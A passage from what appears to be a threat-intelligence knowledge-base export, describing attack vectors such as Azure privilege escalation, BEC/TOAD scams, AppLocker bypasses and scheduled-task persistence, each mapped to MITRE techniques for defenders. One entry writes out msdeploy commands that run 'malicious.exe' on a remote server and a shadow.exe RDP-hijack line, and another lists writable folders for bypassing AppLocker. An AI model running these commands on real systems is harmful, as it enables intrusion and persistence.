- **Manipulation and Control:** Modifying security controls, configurations, or resource 
access to facilitate lateral movement, data theft, or additional attacks.[3][1]
- **Data Breach and Resource Manipulation:** Exfiltration of sensitive data or disruption 
of critical services.

The impact can include unauthorized administrative actions, permanent backdoors 
via modified role assignments, data breaches, and complete compromise of the Azure environment.[4][3][1]

### Attack Flow and Methodology

1. **Reconnaissance:** Identify eligible users or accounts for PIM role activation 
in Azure AD or resources.
2. **Initial Access:** Gain credentials for a user account eligible for PIM role activation.
3. **Activation:** Use Azure AD PIM to activate the privileged role temporarily 
or request permanent assignment, triggering privileges using documented APIs and management endpoints.
4. **Escalation and Manipulation:** Once privileges are obtained:
    - Add or change eligible members in PIM.
    - Modify resource permissions (via `RoleManagement.ReadWrite.Directory`).
    - Abuse elevated access, e.g., create, delete, or alter resources and audit logs.
5. **Persistence:** Maintain administrative access by adding themselves as eligible 
members or scheduling future eligibility.
6. **Detection Evasion:** Exploit gaps in logging or monitoring or tamper with audit 
logs if possible.
",3,2025-08-20,2025-09-08,,,"{'sequence::succeeds': ['140907eb-c9fb-4330-9d71-656422388b2b', 'b1593e0b-1b3b-462d-9ab6-21d1c136469d'], 'sequence::preceeds': ['f1dc4341-eb45-4d07-8075-b1a6b227cc76', '670504aa-cfb8-4d1f-a5ad-16193822085f']}","[Mobile] Scattered Spider, LAPSUS, APT29","T1078, T1548, T1543, T1098"
0cdaee96-8595-4f3f-ba07-758b8be9d359,Social engineering without attachment or URL,Threat Vectors,clear,"TOAD (Telephone-Oriented Attack Delivery) and BEC (Business Email Compromise) attacks 
are sophisticated forms of social engineering that pose significant threats to organizations. 
These attacks often bypass traditional email security measures by avoiding the use 
of malicious attachments or URLs.    

## TOAD Attacks    

TOAD attacks combine email and voice phishing techniques to trick victims into disclosing 
sensitive information or transferring funds.    

Key characteristics of TOAD attacks:    

- Initial contact via email, urging the recipient to call a phone number
- No malicious attachments or URLs in the email
- Social engineering tactics used during phone conversations
- Often impersonate legitimate brands or authority figures    

## BEC Attacks    

BEC attacks involve impersonating or compromising legitimate email accounts to deceive 
individuals into sharing sensitive information or transferring funds.    

Key characteristics of BEC attacks:    

- Highly targeted and personalized emails
- Often impersonate executives, vendors, or trusted partners
- Create a sense of urgency
- Rarely include malicious payloads
- Frequently target Accounts Payable teams
",2,2024-10-31,2025-01-01,,,"{'sequence::preceeds': ['1a68b5eb-0112-424d-a21f-88dda0b6b8df', 'dd5d942c-bac4-4000-b9a6-ca4fef6cfb84', '6a7a493a-511a-4c9d-aa9c-4427c832a322']}","[ICS] APT38, Lazarus Group",T1589.001
2900d389-3098-49d3-8166-5b2612d03576,Azure - Gather User Information,Threat Vectors,clear,"This technique describes how adversaries obtain information about user accounts 
in Azure Active Directory (AAD), which can be leveraged for further attack planning 
and targeting within a cloud environment.

### Example Attack Scenario

An attacker with limited or no access to an Azure environment targets an organization 
using Azure Active Directory. After they obtain information, attackers then cross-references 
this information with social media profiles and other public data, building a list 
of high-value users and their roles. Armed with these details, the attacker crafts 
targeted phishing campaigns or searches for weak credentials and misconfigurations 
with those accounts. For example, the attacker might use an Azure API such as `Get-AzureADUser` 
to enumerate users if they have a valid credential, or scrape corporate websites 
for employee contact details, inferring Azure AD presence.

### Attack Goals and Impact

- **Primary Goal:** To obtain as much information about users as possible—especially 
privileged or high-value accounts—without alerting defenders.
- **Impact:**
  - Enables targeted social engineering, phishing attacks, and credential stuffing.
  - Helps attackers identify privilege relationships, which aids in lateral movement 
  planning and privilege escalation.
  - Reveals organizational structure, making subsequent attacks more precise and effective.
  - May lead to sensitive data exposure (including personal information if the account 
  is later compromised).

### Attack Flow and Methodology

1. **Discovery & Enumeration:**
  - Attacker passively searches public sources (corporate sites, LinkedIn) for names, 
  roles, group memberships.
  - If attacker obtains a valid account/credential (through phishing or prior compromise), 
  they may use Azure AD enumeration APIs (`Get-AzureADUser`, etc.) to list all 
  users, roles, and privileges.

2. **Data Aggregation:**
  - Combine enumerated internal data (user lists, group memberships) with external 
  information (social media, breached databases).
  - Map relationships and find which users have critical access, such as global 
  administrators, application owners, or service principal managers.

3. **Analysis & Targeting:**
  - Identify users who are most likely susceptible to social engineering (frequently contacted staff, IT helpdesk).
  - Prioritize accounts for further compromise attempts based on access level.

4. **Preparation for Further Attack Phases:**
  - Use gathered user information to launch credential stuffing, spear phishing, 
  consent phishing, or authentication token theft attacks.
  - Attempt further reconnaissance focused on those high-value targets, such as 
  checking group assignment, roles, and recent activity.
",2,2025-08-12,2025-09-04,,,"{'sequence::succeeds': ['58b98d75-fc63-4662-8908-a2a7f4200902', '0cdaee96-8595-4f3f-ba07-758b8be9d359', '06c60af1-5fa8-493c-bf9b-6b2e215819f1']}","APT28, Kimsuky, Lazarus Group, [Enterprise] Moonstone Sleet, [Enterprise] Volt Typhoon","T1589, T1087, T1078.004"
80329dfd-eb12-49da-9f20-565758b55eab,Abuse of 'Always-on VPN' feature on mobile device,Threat Vectors,clear,"The ""Always-on VPN"" feature on mobile devices is designed to ensure that all network 
traffic is routed through a VPN tunnel, providing continuous privacy and security. 
However, this feature can introduce specific threat vectors if abused or improperly implemented.

### Key Threat Vectors and Risks

- **Malicious VPN Apps and Abuse of Permissions**  
  Many VPN apps, especially on Android, have been found to abuse the permissions 
  granted by the VPN service. Malicious or poorly designed VPN apps can:
  - Harvest sensitive user data (such as SMS history and contact lists).
  - Inject code or malware into network traffic.
  - Route user traffic through untrusted third-party servers.
  - Intercept sensitive information, including banking and social network credentials.
  
The ""Always-on VPN"" feature, if enabled with a malicious app, ensures that *all* 
device traffic is exposed to the app, amplifying the potential for abuse and data exfiltration.

- **Traffic Leakage Despite 'Always-on VPN'**  
  On Android, even with ""Always-on VPN"" and the ""Block connections without VPN"" 
  (VPN Lockdown) feature enabled, some traffic can leak outside the VPN tunnel. 
  This leakage occurs particularly when:
  - The device connects to a new WiFi network and performs connectivity checks 
  (such as checking for captive portals).
  - The leaked data can include source IP addresses, DNS lookups, HTTPS, and NTP traffic.
  
This is a design choice in Android, and such leaks may expose user information or 
device identifiers to local networks or attackers, undermining the privacy guarantees 
of the VPN.

- **Split Tunneling and Unintended Bypasses**  
  Some VPN apps or device configurations allow for split tunneling, where only certain 
  traffic goes through the VPN. If misconfigured, sensitive data may bypass the VPN, 
  exposing it to interception on insecure networks.

- **Device Compromise and Credential Theft**  
  If a device with Always-on VPN is compromised (e.g., stolen or infected with malware), 
  attackers could potentially exploit the persistent VPN connection to maintain 
  access to internal networks or exfiltrate data. While certificate revocation and 
  account disabling can mitigate this, there is a window of risk before such actions are taken.
  ",1,2025-04-23,2025-04-23,,,,,"T1133, T1078, T1195, T1199"
10a89280-d42e-446d-9f8d-840b1218f532,Azure - Elevated Access Toggle,Threat Vectors,clear,"## Example Attack Scenario

Once inside, the attacker enables the **""Access management for Azure resources""** 
toggle in Entra ID properties. This action assigns the attacker the *User Access 
Administrator* role at the **root scope**, granting them permission to manage RBAC 
(Role-Based Access Control) assignments for every subscription and management group 
in the tenant. The attacker uses these elevated rights to create a new user and 
assigns it the *Owner* role at root, establishing durable persistence and full-control 
access throughout Azure resources.

## Attack Goals and Impact

The primary goal for adversaries is to escalate their privileges from Azure AD into 
all Azure subscriptions within the tenant. Impact includes:
- **Total control:** Complete administration of every Azure resource, service, management 
group, and subscription—akin to “God-mode” access.
- **Persistence:** Ability to create backdoor accounts or roles that will survive 
remediation attempts if defenders only remove the initially compromised account.
- **Disruption or exfiltration:** Attackers can shut down services, delete resources, 
steal sensitive data, or create new destructive attack paths.

## Attack Flow and Methodology

1. **Elevated Access Activation**
  - In the Entra ID portal, the adversary enables “Access management for Azure resources.” 
  This assigns the User Access Administrator role to their account at the Azure 
  *root scope* (`/`), above all subscriptions and management groups.
2. **Privilege Escalation and Persistence**
  - With root scope RBAC control, the attacker can grant themselves (or secondary 
  shadow accounts) *Owner* or similarly privileged roles across any and all Azure resources.
3. **Attack Expansion**
  - The attacker now has unrestricted access to create, modify, or delete resources 
  (VMs, networks, storage, etc.), read sensitive data, and assign permissions to 
  malicious applications for further exploitation.
  - May use automation (PowerShell, Azure CLI) for rapid propagation.
4. **Detection Evasion**
  - The activity of toggling Elevated Access is logged in the Directory Activity 
  log (AuditLogs), but is not always integrated with standard subscription or management 
  group logs, making it harder to detect through routine monitoring.
",2,2025-08-28,2025-09-04,,,"{'sequence::succeeds': ['2900d389-3098-49d3-8166-5b2612d03576', '2743bf18-3b86-4721-bf3e-153dcda0b149'], 'sequence::preceeds': ['5d43ef75-4637-4a75-b1ed-6716052cff0e', 'bcf3bb96-ed97-4853-98ab-937c2d214f4e']}","Scattered Spider, LAPSUS, APT29","T1078.004, T1098.003, T1548.005"
66277f27-d57b-47f8-bc9c-b024c7cd1313,Abuse Windows Utilities to Enable Persistence,Threat Vectors,clear,"1. Msdeploy.exe\
**Description**: The Microsoft Web Deployment Tool used for syncing content
and configurations. Threat actors can deploy web shells or 
malicious applications to servers.

Examples:

```python
msdeploy.exe -verb:sync -source:contentPath=C:\malicious_site -dest:contentPath=""Default Web Site""
```
This command synchronizes the contents from the local directory C:\malicious_site 
to the IIS web application named ""Default Web Site"". It deploys or updates the web 
content of the default website with the files from C:\malicious_site.

```python
Msdeploy.exe -verb:sync -source:runCommand=""cmd /c start malicious.exe"" -dest:auto,computerName=target-server
```
This command uses Msdeploy.exe to run a command on a remote server (target-server)
that starts a malicious executable (malicious.exe), allowing the attacker to maintain
persistence and execute code under the guise of a legitimate process.

2. Shadow.exe\
**Description**: A Terminal Services command that monitors or controls 
Remote Desktop sessions. Threat actors can hijack sessions 
to maintain persistence or spy on users.

Example:

```python
shadow.exe 1 /server:target-server
```
Using shadow.exe, an attacker can connect to an active RDP session on target-server, 
potentially allowing them to observe or control the session without the user's knowledge. 
This can be used to capture sensitive information or further compromise the system.",1,2024-11-06,2024-11-06,,,{'atomicity::implements': ['d5039f2c-9fcc-4ba3-ad6a-da8c891ba745']},"[Enterprise] APT29, UNC2452, [ICS] APT38, Lazarus Group, [ICS] Wizard Spider, UNC1878","T1547.001, T1218"
ff8c52ac-77d0-4bee-9f6d-e40fc6e0da63,AppLocker bypass using writable folders,Threat Vectors,clear,"AppLocker bypass using writable folders is a technique where an attacker
exploits the fact that AppLocker only checks the executable file's path,
not the path of the folder containing the executable. By placing a malicious
executable in a writable folder that is not restricted by AppLocker, an
attacker can bypass AppLocker controls.  

AppLocker uses a set of rules to determine which applications are allowed
to run. These rules are based on factors like the application's path,
publisher, and hash. If a threat actor can write to a folder that is allowed
by AppLocker, they can potentially bypass the restrictions.  

### Examples for AppLocker writable folders

The list below includes some of the folders in Windows where a standard user
have write permissions by default. These permissions can be used by threat
actors and let them to bypass AppLocker Windows whitelisting functionality.
For more information please check ref [1], [2].  

- `C:\Windows\Tasks` - Windows Tasks directory, writable by the ""Users"" group
- `C:\Windows\Temp`  - Temporary Files
- `C:\Windows\tracing`
- `C:\Windows\Registration\CRMLog`
- `C:\Windows\System32\FxsTmp`
- `C:\Windows\System32\com\dmp`
- `C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys`
- `C:\Windows\System32\spool\PRINTERS`
- `C:\Windows\System32\spool\SERVERS`
- `C:\Windows\System32\spool\drivers\color`
- `C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter`
- `C:\Windows\System32\Tasks_Migrated`
   (after peforming a version upgrade of Windows 10)
- `C:\Windows\SysWOW64\FxsTmp`
- `C:\Windows\SysWOW64\com\dmp`
- `C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter`
- `C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System`

Additional ref [3], [4]:

- `%APPDATA%`                        # Application Data / Roaming User Data
- `%LOCALAPPDATA%`                   # Local Application Data / Local User Data
- `%USERPROFILE%\Desktop`            # User's Desktop): Desktop
- `%USERPROFILE%\AppData\Local\Temp` # Local Low, this is a subfolder of %LOCALAPPDATA%

### Other possible writable folders in AppLocker

There are some other possible writable folders in `C:\WINDOWS` where a
standard Windows user may have write permissions by default. For example,
'accesschk.exe' from Sysinternals Suite can be used to find folders that
are writable and can be leveraged. Furthermore, 'icacls.exe' can be used to
determine if we also have execute rights within the targeted folder.

Different threat actors are actively exploiting this AppLocker bypass
technique to deploy malware, execute malicious code, and gain persistence
on compromised systems.

### Example

Lenovo devices include a file, MFGSTAT.zip, in C:\\Windows that is writable
by authenticated users. An attacker can embed a malicious payload into an
NTFS alternate data stream within this ZIP file and invoke it via a signed
Windows binary (e.g., AppVLP.exe), bypassing AppLocker rules.  
",1,2025-07-14,2025-07-15,,,,"[ICS] Lazarus Group, Lazarus Group",T1218
9fc6fdcd-c06e-4f7b-8562-a6753d8be683,Windows system links used for file redirection attack,Threat Vectors,clear,"By using different types of file system links, such as hard links or junctions, 
attackers can trick the privileged component into operating on files which is 
not supposed to access. The end goal for such attacks is usually to write an 
attacker-supplied executable (such as a DLL or a script) to the disk, 
and to get it executed with system permissions (ref \[1\]).  

For example, to achieve code execution as the SYSTEM user, threat actors start 
an orchestrator update service, which will result in a malicious DLL being run 
with SYSTEM privileges due to a DLL hijacking issue within the Update Session 
Orchestrator Service. (ref \[2\])  

The most common file redirection links are:

##### LNK files (shortcut files)

These are files with the .LNK extension, which are used to create shortcuts to 
other files or folders. Attackers can exploit LNK files to execute malicious 
code by creating a shortcut that points to a malicious file instead of the original 
intended target.  

##### Junction points

Junction points are special folders in Windows that link to another folder, allowing 
the operating system to treat the content of the target folder as if they were 
located in the junction point's folder. Attackers can use junction points to redirect 
file access to a different location, potentially allowing them to access or modify 
files that should not be accessible.  

Junctions are a feature of the NT file system (NTFS) that make it possible to link one 
directory into another. They are used by default, linking some directories such as 
""C:\\Documents and Settings"".  

A common vulnerable pattern may exist in the hard (junction) links as follows 
(for example CVE-2020-0787):

* A privileged service exposes functionality that can be triggered through some 
interprocess communication (IPC) mechanism, such as remote procedure call (RPC). 
That functionality can be triggered by users running at lower privilege levels.  
* That functionality operates on a file (writing data into that file) that is 
located under a globally writable directory. The operation is done without 
impersonation, meaning it occurs with the permissions of that system service.  

To exploit this vulnerability in the system links a threat actor first creates a junction 
between that directory and their target, which is usually C:\\Windows or one of its 
subdirectories. Next, the attacker triggers the RPC call, which follows the junction to 
overwrite a system DLL file. Finally, that malicious DLL is loaded by some service, 
and the attacker's supplied code gets executed with system permissions (ref \[1\]).  

##### Symbolic links:

Symbolic links (also known as symlinks or soft links) are similar to junction points, 
but they can link to individual files as well as folders. Symbolic links can be used to 
redirect file access to a different file or folder, which may allow an attacker to 
execute malicious code or access sensitive information.  

##### NTFS Alternate Data Streams (ADS):

Alternate Data Streams are a feature of the NTFS file system that allows storing 
metadata within a file. Attackers can abuse ADS to hide malicious code or sensitive 
information within an innocent-looking file. When the file is accessed, the malicious 
content in the ADS is executed without the user's knowledge.  
",1,2024-04-24,2024-06-25,,,,,"T1562, T1027.012"
78d5e363-14db-40c0-a1c4-4ba02a3e60d4,Azure - Hijack Entra ID Applications,Threat Vectors,clear,"Hijacking an application (by adding a rogue secret or certificate) with granted permissions 
will allow the attacker to access data that is normally protected by MFA requirements.
Modification of an application via the browser - The attacker connected to the 
Azure Portal with a web browser and added a new secret to an App Registration that
had permissions to read all mail. There is no supported way to add a credential 
to an Enterprise Application (service principal) via the browser.
Modification of an application via PowerShell - The attacker connected to the Microsoft 
365 tenant using Azure AD PowerShell. Once connected they added certificates to App 
Registrations and Enterprise Applications that had the mail.read and files.read permission.",3,2022-03-17,2025-10-01,,,,"[Enterprise] APT29, UNC2452","T1114, T1114.002, T1098.001"
bdb9fd43-a9f9-4026-84a5-0b52d3b0243b,Rogue access point,Threat Vectors,clear,"A rogue access point (AP) is any wireless access point connected to a network without 
explicit authorization from network administrators. These unauthorized devices 
can be set up deliberately by attackers or unintentionally by employees, and they 
bypass the security controls and configurations established by IT teams, exposing 
the network to significant risks.

### How Rogue Access Points Work

- **Impersonation:** Rogue APs may mimic legitimate networks by copying the Service 
Set Identifier (SSID), tricking users into connecting to them.
- **Open Access:** Many operate without passwords or encryption, making them easy 
for devices to discover and connect to, but extremely vulnerable.
- **Traffic Interception:** Once connected, attackers can intercept all data transmitted, 
including credentials and confidential information, using packet sniffing tools.
- **Attack Platform:** They serve as a launchpad for further attacks such as man-in-the-middle (MitM), 
malware distribution, phishing, and ransomware deployment.

### Risks and Threats

- **Data Interception & Theft:** Sensitive information, such as login credentials, 
financial data, and confidential documents, can be captured.
- **Man-in-the-Middle Attacks:** Attackers can intercept, modify, or inject data 
into communications, hijack sessions, and steal credentials.
- **Malware Distribution:** Rogue APs can be used to distribute malware or ransomware 
to connected devices.
- **Credential Theft:** Users may unknowingly submit credentials to attackers.
- **Network Disruption:** Rogue APs can interfere with legitimate network operations, 
causing downtime and instability.
- **Regulatory Compliance Violations:** Industries with strict data regulations 
(e.g., healthcare, finance) risk non-compliance and potential fines if rogue APs are present.
",1,2025-04-24,2025-04-24,,,,,"T0860, T1422.002, T1638, T1557.004"
b8740296-9d34-453b-8127-b5d8659a6138,Malicious profile installed on mobile device,Threat Vectors,clear,"A ""malicious profile"" refers to a configuration file installed on a mobile device 
that compromises its security and privacy. These profiles exploit the device's settings 
to grant attackers unauthorized control or access to sensitive data, making them 
a serious threat vector for mobile devices.

### How Malicious Profiles Are Installed

Attackers use various techniques to deploy malicious profiles on devices:

1. **Phishing Attacks**: Victims are tricked into clicking links or downloading 
files via phishing emails or websites. These links often promise to fix security 
issues or provide valuable services, convincing users to install the malicious profile.

2. **Social Engineering**: Attackers manipulate users into believing the profile 
is legitimate, often using fake security alerts or enticing offers.

3. **Man-in-the-Middle (MitM) Attacks**: Over unsecured Wi-Fi networks, attackers 
intercept communications and install malicious profiles by redirecting traffic through 
spoofed hotspots.

4. **Third-Party App Stores**: Android users may unknowingly install malicious apps 
containing configuration profiles from unverified sources.

### Implications of Malicious Profiles

Malicious profiles can severely compromise a device's security, privacy, and functionality:

1. **Persistent Control**: Once installed, these profiles often cannot be removed 
manually, allowing attackers long-term control over the device settings.

2. **Data Interception**:
  - Profiles may configure devices to route traffic through malicious VPNs or proxy 
  servers, enabling attackers to intercept and decrypt sensitive information such 
  as emails, banking credentials, and social media passwords.
  - Installation of untrusted root certificates allows attackers to bypass TLS/SSL 
  encryption and impersonate secure websites.

3. **Surveillance Capabilities**:
  - Attackers can record conversations, monitor messages, and even capture audio 
  from the environment using malicious profiles.
  - Corporate devices are particularly vulnerable as attackers may redirect email 
  traffic or manipulate enterprise configurations.

4. **Device Misconfiguration**:
  - Malicious profiles can alter Wi-Fi settings, enforce insecure passcodes, or 
  disable security apps, weakening the device’s overall security posture.

5. **Persistence for Future Attacks**:
  - By tampering with trust settings (e.g., certificates), attackers ensure that 
  the device implicitly trusts them for future actions without user intervention.

### Examples of Exploits

- **iOS Devices**:
  Attackers exploit configuration vulnerabilities by installing untrusted profiles 
  that intercept secure connections and manipulate user sessions. For example, phishing 
  campaigns may trick users into downloading profiles that hijack email traffic 
  or steal credentials.

- **Android Devices**:
  Malware such as ""Godless"" exploits older Android versions by embedding malicious 
  configuration files within apps downloaded from third-party stores. These files 
  gain root access and install spyware for complete device takeover.
",1,2025-04-14,2025-04-14,,,,,"T1456, T1624, T1631.001, T1407, T1417"
cf14af27-ea36-4306-9134-8d9ccb69a617,Illicit VPC peering requests,Threat Vectors,clear,"Threat actors may attempt to gain initial access to EC AWS environments by
sending a malicious/illicit VPC peering request to EC VPC administrators.
If the VPC administrator approves the request, the adversary would see their 
network joined with the target, and be able to pivot there freely.

VPC peering requests could also be used in the data exfil stage by 
a threat actor using this method to send data out of an EC AWS account
that the threat actor controls

Virtual Private Clouds, or VPCs, is a logically isolated portion of 
networking that AWS assigns to clients. VPC peering is a feature that allows VPCs
living in different accounts to be joined in a common IP space, for example to 
allow different services to communicate to each others.
",1,2022-11-21,2022-11-21,,,,,"T1078.004, T1599"
4ac2b666-736a-42c5-9548-50393ea6bc46,Cloning private repositories,Threat Vectors,clear,"A threat actor can clone legit repositories, embed malicious code
but make them looks like legit. Their purpose is to entice a developer
to download and use the decoy repositories.    

Unauthorized cloning of private repositories is a form of IP theft.
Adversaries from external hackers to insiders aim to steal source code,
configuration details and secrets. The stolen information can be used
in multiple ways such as competitive advantage, discover vulnerabilities,
compromise other systems or mimic the original repositories to trick
developers into their rogue repository.  

After cloning of the repository, as a next step, the threat actor
spreads public available links from where a developer downloads its
malicious content.  

The threat actors employ various techniques to clone public or private
repositories, often with malicious intent. Some of the methods for
repository cloning include:  

### Misconfigured GitHub repositories

Threat actors exploit misconfigurations in GitHub, Gitlab or similar
repositories. They search for repositories with sensitive information
(such as API keys, credentials, or proprietary code) that have been
accidentally exposed. Once they find such repositories, they clone
them to their own accounts or local systems. By doing so, they gain
access to the codebase and any sensitive data within it ref [4].          

### Automated cloning and credential harvesting

In some cases, threat actors use automated tools to clone public
repositories. They specifically target repositories containing
Identity and Access Management (IAM) credentials. By cloning these
repositories, they harvest sensitive credentials, which can later
be used for unauthorized access, example in ref [5].            

### Repo confusion scheme

This scheme involves cloning existing repositories, Trojanizing them
(adding malicious code), and re-uploading them. The attackers hope that
the developers will mistakenly download the infected version.      

Once a threat actor has access to a CI pipeline, they obtain access key
or tokens to the SCM-Manager (ref [6]) and can perform action or operation
allowed for those credentials such as cloning private repository. This may
lead to unauthorized access to sensitive information and/or intellectual
property theft. Threat actors may identify weaknesses in the code and later
exploit them.      

A common command used for repositories cloning is:

git clone git://github.com/username/reponame.git

### Injection of a malicious code directly into exposed libraries

Some of the threat actor groups are observed to inject malicious code
directly into exposed libraries or submit fraudulent pull requests.
This technique can be used in a combination with repository cloning
to convey a malicious payload and infect developer systems and pilfer
sensitive files further ref [7].    
",1,2025-03-05,2025-03-06,,,,"[ICS] Lazarus Group, Lazarus Group, [Enterprise] APT29, APT29",T1567.001
fd0542bd-1541-42a7-8c07-0e073a198a53,Network service discovery,Threat Vectors,clear,"Network service discovery is the process of identifying and mapping
the services and applications running on a network. This can include
discovering open ports, protocols, and services, as well as identifying
the operating systems and devices connected to the network. Devices that
support NSD include printers, webcams, HTTPS servers, and other mobile
devices ref [1].  

Adversaries may attempt to get a listing of services running on remote hosts, 
including those that may be vulnerable to remote software exploitation. 
Methods to acquire this information include port scans and vulnerability 
scans, using tools that are brought onto a system.  

### Types of Network Service Discovery:

- Active Scanning: Sending probes to the network to gather information
about the services and devices connected.
- Passive Scanning: Monitoring network traffic to gather information
about the services and devices connected.
- OS Detection: Identifying the operating system and device type
connected to the network.

### Some of the tools which can be used for network service discovery:

- Nmap: A popular network scanning tool that can perform active and
passive scanning.
- Netcat - this tool is a command-line utility scanning tool across
network connections over TCP and UDP protocols. It scan ports, transfer
files, create chat servers, and perform HTTP requests ref [7].  
- MASSCAN - Internet-scale port scanner. It can scan the entire network
in a very short interval of time ref [8].   
- OpenVAS: A vulnerability scanner that can perform network service
discovery and identify potential vulnerabilities.
- Nessus: A vulnerability scanner that can perform network service
discovery and identify potential vulnerabilities.
- Wireshark: A network protocol analyzer that can be used to monitor
network traffic and identify services and devices connected.
- Netstat (net commands Windows): A command-line tool that can be used
to view active
network connections and listening ports.
- Native Bonjour application
- Intermapper tool: Stands out for its strong focus on visual network
discovery and mapping. A free 30-day trial is available on request.
- NetBrain: Goes beyond traditional network discovery tools, offering
a comprehensive solution for visualizing, managing, and automating
hybrid networks.

Example for such activity could be scan port in a specific ip and
port ranges.
",1,2025-02-04,2025-02-04,,,{'atomicity::implements': ['d5039f2c-9fcc-4ba3-ad6a-da8c891ba745']},"[ICS] Lazarus Group, Lazarus Group",T1046
efe13bd7-c621-423b-b226-9b536766a252,Direct modification of registry keys to tamper scheduled task,Threat Vectors,clear,"Direct modification of registry keys to tamper with scheduled tasks
involves altering the Windows Registry to manipulate or disable scheduled
tasks. 

Scheduled tasks are stored in the Windows Registry, and modifying these
registry keys can allow an attacker to:

- Disable or modify existing tasks: by changing the registry keys
associated with a scheduled task, an attacker can prevent the task from
running or alter its behavior.
- Create new malicious tasks: An attacker can add new registry keys
to create a malicious scheduled task that runs without the user's
knowledge.
- Elevate privileges: modifying registry keys can allow an attacker
to escalate privileges, enabling them to execute tasks with higher
privileges.

The registry keys which involved in scheduled tasks could be:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache

```
This key contains subkeys for each scheduled task, including:

- Tasks: Stores information about each task, such as the task name,
description, and execution settings.
- Boot: Stores information about tasks that run at boot time.
- Logon: Stores information about tasks that run at logon time.

### Modifying registry keys to tamper with scheduled tasks

To modify registry keys and tamper with scheduled tasks, an attacker
would typically follow these steps:

  - Access the Registry Editor: The attacker would need to access the
  Windows Registry Editor (Regedit.exe) with administrative privileges.
  - Navigate to the scheduled task registry key. 
  The attacker would navigate to the registry key:
  `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache key`.
  - Identify the target task: The attacker would identify the subkey
  associated with the scheduled task they want to modify or disable.
  - Modify the registry key: The attacker would modify the registry
  key to change the task's behavior, such as changing the execution
  settings or disabling the task.  

### Examples of registry key modifications

Some examples of registry key modifications that can tamper
with scheduled tasks include:

- Disabling a task: Setting the Enabled value to 0 in the task's subkey.
- Changing the task's execution settings: Modifying the Actions or Triggers
values in the task's subkey.
- Creating a new malicious task: Adding a new subkey with malicious
settings, such as executing a malicious executable.  
",1,2025-05-22,2025-06-02,,,{'atomicity::implements': ['5e66f826-4c4b-4357-b9c5-2f40da207f34']},"[Enterprise] HAFNIUM, HAFNIUM, [Mobile] APT28, APT28, [ICS] Lazarus Group, Lazarus Group","T1112, T1543, T1543.003, T1053.005"
edfe43fd-4a92-4f2d-a733-40e235be1b25,Scheduled task manipulation using Azure CLI,Threat Vectors,clear,"Scheduled task manipulation using Azure CLI is a sophisticated threat vector that 
allows adversaries to establish persistence and execute malicious code in cloud environments. 
While the search results do not specifically mention Azure CLI, we can extrapolate 
the threat based on the general concept of scheduled task abuse.    

## Key aspects of the threat:    

1. **Persistence mechanism**: Adversaries can create or modify scheduled tasks to 
run malicious code at specified times or system startup, ensuring long-term access 
to compromised systems.    

2. **Privilege escalation**: Tasks can be configured to run with elevated privileges, 
often as SYSTEM, granting attackers the highest level of access on Windows systems.    

3. **Stealth**: Attackers may create ""hidden"" scheduled tasks by manipulating registry 
values, making them invisible to standard enumeration tools.    

4. **Versatility**: Scheduled tasks can be used for various malicious purposes, 
including initial access, lateral movement, and executing additional payloads.    

## Specific techniques:    

1. **Command execution**: Adversaries often use scheduled tasks to open command 
shells or execute arbitrary binaries from user-writable directories.    

2. **Network connections**: Tasks may be configured to reach out to external domains 
and download malicious payloads on a recurring schedule.    

3. **Abuse of legitimate tools**: Attackers can leverage native Windows utilities 
like schtasks.exe or PowerShell cmdlets to create and manage malicious tasks.    

4. **Registry manipulation**: Advanced adversaries may directly modify registry 
keys related to scheduled tasks to evade detection.    

5. **Masquerading**: Malicious tasks can be disguised as legitimate system processes 
or software updates to avoid suspicion.
",1,2024-12-18,2024-12-19,,,"{'support::enabled': ['670504aa-cfb8-4d1f-a5ad-16193822085f'], 'support::synergize': ['5e66f826-4c4b-4357-b9c5-2f40da207f34'], 'sequence::preceeds': ['60c5b065-7d06-4697-850f-c2f80765f10b']}",,"T1053, T1053.005, T1053.003, T1059, T1078, T1136"
85c8e0dd-b012-402d-bb09-5d354c16ebb9,Azure - Local Resource Hijack,Threat Vectors,clear,"The following threat vector involves attackers tampering with local files or resources—such 
as profile scripts or pipeline artifacts—to escalate privileges and gain unauthorized 
access to cloud resources.

## Example Attack Scenario

An adversary, with write access to a storage account linked to Azure Machine Learning 
(AML) or Azure CloudShell, modifies a startup or invoker script (e.g., `.bashrc` 
or pipeline component scripts) stored in blob storage. For AML, the attacker replaces 
a component invoker script with malicious code that executes during the next scheduled 
pipeline job. The code then exploits the AML compute’s managed identity—potentially 
inheriting elevated permissions from the pipeline owner—to extract secrets from 
Azure Key Vault, reassign roles, or access broader Azure resources. In CloudShell, 
the `.bashrc` file inside the `.IMG` profile is altered to run commands that covertly 
add an attacker account to privileged roles across the subscription.

## Attack Goals and Impact

- **Privilege escalation**: The attacker aims to execute code or commands under 
a more privileged identity, going from low user/storage access to Contributor, Owner, 
or admin roles in Azure. This may involve extracting secrets from Key Vaults, accessing 
sensitive data, or reassigning role memberships.
- **Persistence and lateral movement**: By hijacking profile/startup scripts or 
pipeline artifacts, the attacker ensures continued access, potentially moving laterally 
to other cloud services or even on-premises networks—all without triggering immediate alarms.
- **Resource abuse**: Attackers may run unauthorized workloads, such as cryptominers, 
or deploy malware, impacting resource costs and security posture.

## Attack Flow and Methodology

1. **Script modification**:
  - AML case: The attacker modifies or uploads a malicious invoker script to the 
  pipeline component directory in the Storage Account. If necessary, the YAML config 
  is altered to ensure execution of the script.
  - CloudShell case: The attacker alters the `.bashrc` (or PowerShell profile) 
  file inside the profile `.IMG` so that, on shell launch, privileged escalation 
  or backdoor commands are executed.
2. **Execution and privilege escalation**:
  - On the next job/pipeline run (AML) or CloudShell launch, the modified script 
  executes with the context of the managed/system identity—often inheriting the 
  permissions of the pipeline owner or compute administrator.
  - Malicious code retrieves secrets, changes role assignments, or accesses broader 
  Azure resources; for CloudShell, commands may add attacker accounts to privileged 
  Azure roles automatically.
3. **Persistence and impact**:
  - The attacker may persist access by continuously modifying invocation scripts 
  or startup files, or by creating new high-privilege accounts/role assignments.
  - Broader impact includes data exfiltration, resource hijacking, or stealthy 
  malware deployment.
",2,2025-08-26,2025-09-04,,,{'sequence::preceeds': ['b1593e0b-1b3b-462d-9ab6-21d1c136469d']},APT29,"T1496, T1098.001, T1078.004"
